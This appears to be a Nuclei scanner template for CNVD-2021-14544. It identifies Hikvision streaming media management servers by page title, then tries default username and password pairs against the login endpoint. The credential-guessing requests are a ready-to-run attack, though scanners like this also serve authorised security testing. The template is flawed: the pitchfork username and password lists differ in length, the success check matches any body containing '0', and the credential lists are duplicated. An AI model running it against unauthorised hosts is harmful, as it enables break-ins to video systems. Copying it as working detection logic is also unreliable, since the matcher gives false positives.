id: hikvision-streaming-media-weak-password-cnvd-2021-14544
info:
  name: Hikvision Streaming Media Management Server Weak Password Vulnerability (CNVD-2021-14544)
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password,CNVD-2021-14544

variables:
  username:
    - admin
    - admin123
    - root
  password:
    - 123456
    - password
    - admin123
    - P@ssw0rd

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "<TITLE>流媒体管理服务器</TITLE>"
          - "Video Transmission Management Server"

  - method: POST
    path:
      - "{{BaseURL}}/data/login.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "userName={{username}}&password={{password}}"
    attack: pitchfork
    payloads:
      username:
        - admin
        - admin123
        - root
      password:
        - 123456
        - password
        - admin123
        - P@ssw0rd
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0"
        part: body
